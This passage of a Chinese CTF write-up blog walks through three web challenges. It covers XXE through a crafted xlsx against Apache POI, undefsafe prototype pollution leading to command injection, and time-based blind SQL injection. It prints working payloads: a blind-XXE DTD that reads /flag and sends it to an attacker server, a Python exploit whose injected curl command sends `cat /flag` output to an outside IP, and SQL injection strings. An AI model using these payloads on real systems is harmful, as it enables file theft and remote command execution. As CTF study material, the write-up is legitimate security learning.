org.apache.commons.fileupload.FileUploadException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItemFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.servlet.ServletFileUpload;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.openxml4j.exceptions.InvalidFormatException;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UploadServlet</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String savePath;</span><br><span class="line">        File tempFile;</span><br><span class="line">        String message;</span><br><span class="line">        savePath = getServletContext().getRealPath(<span class="string">"/WEB-INF/upload"</span>);</span><br><span class="line">        String tempPath = getServletContext().getRealPath(<span class="string">"/WEB-INF/temp"</span>);</span><br><span class="line">        tempFile = <span class="keyword">new</span> File(tempPath);</span><br><span class="line">        <span class="keyword">if</span>(!tempFile.exists())</span><br><span class="line">            tempFile.mkdir();</span><br><span class="line">        message = <span class="string">""</span>;</span><br><span class="line">        ServletFileUpload upload;</span><br><span class="line">        DiskFileItemFactory factory = <span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line">        factory.setSizeThreshold(<span class="number">0x19000</span>);</span><br><span class="line">        factory.setRepository(tempFile);</span><br><span class="line">        upload = <span class="keyword">new</span> ServletFileUpload(factory);</span><br><span class="line">        upload.setProgressListener(<span class="keyword">new</span>  Object()     <span class="comment">/* anonymous class not found */</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">_anm1</span> </span>&#123;&#125;</span><br><span class="line">);</span><br><span class="line">        upload.setHeaderEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">        upload.setFileSizeMax(<span class="number">0x100000L</span>);</span><br><span class="line">        upload.setSizeMax(<span class="number">0xa00000L</span>);</span><br><span class="line">        <span class="keyword">if</span>(!ServletFileUpload.isMultipartContent(request))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            List list = upload.parseRequest(request);</span><br><span class="line">            Iterator iterator = list.iterator();</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(!iterator.hasNext())</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                FileItem fileItem = (FileItem)iterator.next();</span><br><span class="line">                <span class="keyword">if</span>(fileItem.isFormField())</span><br><span class="line">                &#123;</span><br><span class="line">                    String name = fileItem.getFieldName();</span><br><span class="line">                    String s = fileItem.getString(<span class="string">"UTF-8"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    String filename = fileItem.getName();</span><br><span class="line">                    <span class="keyword">if</span>(filename != <span class="keyword">null</span> &amp;&amp; !filename.trim().equals(<span class="string">""</span>))</span><br><span class="line">                    &#123;</span><br><span class="line">                        String fileExtName = filename.substring(filename.lastIndexOf(<span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">                        InputStream in = fileItem.getInputStream();</span><br><span class="line">                        <span class="keyword">if</span>(filename.startsWith(<span class="string">"excel-"</span>) &amp;&amp; <span class="string">"xlsx"</span>.equals(fileExtName))</span><br><span class="line">                            <span class="keyword">try</span></span><br><span class="line">                            &#123;</span><br><span class="line">                                Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">                                Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">                                System.out.println(sheet.getFirstRowNum());</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">catch</span>(InvalidFormatException e)</span><br><span class="line">                            &#123;</span><br><span class="line">                                System.err.println(<span class="string">"poi-ooxml-3.10 has something wrong"</span>);</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        String saveFilename = makeFileName(filename);</span><br><span class="line">                        request.setAttribute(<span class="string">"saveFilename"</span>, saveFilename);</span><br><span class="line">                        request.setAttribute(<span class="string">"filename"</span>, filename);</span><br><span class="line">                        String realSavePath = makePath(saveFilename, savePath);</span><br><span class="line">                        FileOutputStream out = <span class="keyword">new</span> FileOutputStream((<span class="keyword">new</span> StringBuilder()).append(realSavePath).append(<span class="string">"/"</span>).append(saveFilename).toString());</span><br><span class="line">                        <span class="keyword">byte</span> buffer[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> len = <span class="number">0</span>; (len = in.read(buffer)) &gt; <span class="number">0</span>;)</span><br><span class="line">                            out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line"></span><br><span class="line">                        in.close();</span><br><span class="line">                        out.close();</span><br><span class="line">                        message = <span class="string">"\u6587\u4EF6\u4E0A\u4F20\u6210\u529F!"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span>(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(FileUploadException e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        request.setAttribute(<span class="string">"message"</span>, message);</span><br><span class="line">        request.getRequestDispatcher(<span class="string">"/ListFileServlet"</span>).forward(request, response);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">makeFileName</span><span class="params">(String filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> StringBuilder()).append(UUID.randomUUID().toString()).append(<span class="string">"_"</span>).append(filename).toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">makePath</span><span class="params">(String filename, String savePath)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> hashCode = filename.hashCode();</span><br><span class="line">        <span class="keyword">int</span> dir1 = hashCode &amp; <span class="number">0xf</span>;</span><br><span class="line">        <span class="keyword">int</span> dir2 = (hashCode &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">        String dir = (<span class="keyword">new</span> StringBuilder()).append(savePath).append(<span class="string">"/"</span>).append(dir1).append(<span class="string">"/"</span>).append(dir2).toString();</span><br><span class="line">        File file = <span class="keyword">new</span> File(dir);</span><br><span class="line">        <span class="keyword">if</span>(!file.exists())</span><br><span class="line">            file.mkdirs();</span><br><span class="line">        <span class="keyword">return</span> dir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实话说,第一步读完后看了眼所有的源码。没看出什么端倪。(其实是看漏了)<br>第一想法是幽灵猫。但是问了下队友说8009端口不是开的就作罢。<br>然后想利用刚刚的任意文件下载读flag.却发现被定位到404了。仔细看源码会发现<br>DownloadServlet.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(fileName != <span class="keyword">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="string">"flag"</span>))</span><br><span class="line">       &#123;</span><br><span class="line">           request.setAttribute(<span class="string">"message"</span>, <span class="string">"\u7981\u6B62\u8BFB\u53D6"</span>);</span><br><span class="line">           request.getRequestDispatcher(<span class="string">"/message.jsp"</span>).forward(request, response);</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>果然过滤了关键字。需要其他方法读flag.</p><p>此时回过头发现uploadservlet有一段突兀的源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(filename.startsWith(<span class="string">"excel-"</span>) &amp;&amp; <span class="string">"xlsx"</span>.equals(fileExtName))</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">        Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">        System.out.println(sheet.getFirstRowNum());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(InvalidFormatException e)</span><br><span class="line">    &#123;</span><br><span class="line">        System.err.println(<span class="string">"poi-ooxml-3.10 has something wrong"</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我第一想法是想到之前曾经看过但没做过的swpuctf web5.那道题是我第一次见过能用xlsx打xxe的类型。而它用到的就是一个很老的cve,CVE-2014-3529.</p><p>而这部分代码逻辑表示，如果我们的文件名是excel-开始加上.xlsx结尾，就会用poi解析xlsx。而这个CVE的poi版本恰好是<code>poi-ooxml-3.10</code></p><p>那就不用说了,先试着按流程构造下payload。<br>注意,这里构造payload时最好在zip中打开我们需要修改的<code>[Content-Types].xml</code>。否则可能会出错。这是我听同学说才知道有这种玄学问题。我个人是先将xlsx改为zip,然后winrar直接打开修改xml的poc。最后再改回来。这样应该就没啥问题了。</p><p>发现vps能收到请求。那就直接xxe盲打一把梭了。<br>poc</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">try</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xxxxxx/1.xml"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%int;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>vps上的1.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payl</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://xxxxxxxx/?%payl;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>监听80端口收到flag<br><img src="/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/3.png" alt></p><h1 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h1><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.owner = <span class="string">"whoknows"</span>;</span><br><span class="line">        <span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        <span class="keyword">this</span>.note_list[(<span class="keyword">this</span>.num++).toString()] = &#123;<span class="string">"author"</span>: author,<span class="string">"raw_note"</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="keyword">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="keyword">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">"nobody"</span>, <span class="string">"this is nobody's first note"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">'views'</span>, path.join(__dirname, <span class="string">'views'</span>));</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'public'</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>, &#123; <span class="attr">title</span>: <span class="string">'Notebook'</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/add_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">'please use POST to add a note'</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"add note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"did not add note"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/edit_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to edit a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/delete_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to delete a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete done"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/notes'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">'note'</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/status'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">'/bin/bash'</span>&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">'OK'</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">'Sorry cant find that!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">'Something broke!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure><p>老实说一开始审完源码没啥收获。大概的思路是,题目已经有了一个命令执行。那么我要是能修改它固定死的命令内容就能任意打了。但是这种达成肯定是要原型链污染的。我没看到<code>merge()</code>之类的函数就没继续想了</p><p>然后之后发现这题居然有原题参考的…<br><a href="https://github.com/balsn/ctf_writeup/blob/master/20181124-asisctffinal/README.md#secure-api" target="_blank" rel="noopener">https://github.com/balsn/ctf_writeup/blob/master/20181124-asisctffinal/README.md#secure-api</a><br>仔细看了下发现好像几乎一样啊。只有一个undefsafe依赖的区别.<br>然后就发现这个依赖果然存在原型链污染的问题</p><p><a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">Prototype Pollution</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">"undefsafe"</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">"__proto__.toString"</span>;</span><br><span class="line">a(&#123;&#125;,payload,<span class="string">"JHU"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.toString);</span><br></pre></td></tr></table></figure><p>参照这个例子,我们很快就能找到原型链的污染点在edit_note这。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit_note(id, author, raw) &#123;</span><br><span class="line">       undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">       undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>然后按wp的payload改就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">data=&#123;<span class="string">'raw'</span>:<span class="string">'curl 120.27.246.202/?`cat /flag`'</span>,<span class="string">'id'</span>:<span class="string">'__proto__'</span>,<span class="string">'author'</span>:<span class="string">'byc_404'</span>&#125;</span><br><span class="line">url=<span class="string">'http://bed4f32827b843ca9ad5b763749970dd265f40236d544ada.cloudgame1.ichunqiu.com:8080/'</span></span><br><span class="line">r=s.post(url+<span class="string">'edit_note'</span>,json=data)</span><br><span class="line">print(r.text)</span><br><span class="line">r=s.get(url+<span class="string">"status"</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>这里id污染了后用raw或者author两个属性都能命令执行。当然因为回显的原因我们选择curl外带数据</p><p><img src="/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/4.png" alt></p><h1 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h1><p>这题没做出来确实不太应该。赛后按郁师傅的思路果然一下就出了。不过也证明sql里的技巧确实不少啊。</p><p>首先当然是sql类型.题目只有一个<code>register_do.php</code>,而没有login的功能。<br>测了一会后突然发现，回显变成了<code>WTF???row&gt;20</code>而且你的payload怎么改回显都一致.<br>那么此时可以大致推断下。我们的payload是被拼接进了<code>insert into</code>语句。因此数据库的返回结果才会增多到上限20。</p><p>那么首先猜测结构，构造payload<br><code>username=admin&#39;,if(1=1,sleep(5),1))#</code><br>会发现虽然返回了504。但是的确可以延时.<br>然而再按照这个思路构造盲注payload却发现我们并不能跑出什么结果。此时再访问<code>register_do.php</code>发现row又超出20了.</p><p>所以关键就是，我们要想办法不增加结果,同时还能延时。</p><p>这里就得膜一波郁师傅了。10分钟不到就能出结果…<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^if(ascii(substr((select &#96;2&#96; from (select 1,2 union select * from flag)a limit 1,1),1,1))&#x3D;102,pow(9999,100) or sleep(3),pow(9999,100)),&#39;1&#39;)#</span><br></pre></td></tr></table></figure><p>既然没有什么waf。我们就把主体部分带上if字句进行时间盲注的判断。但是此时我们让结果同时<code>pow(9999,100)</code>也就是报错一下。那么我们就不用担心语句数超过20的上限。</p><p>然后发现表名不知道为什么跑不出来。但是可以直接尝试flag表然后无列名注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;2&#96; from (select 1,2 union select * from flag)a limit 1,1</span><br></pre></td></tr></table></figure><p>exp</p><figure 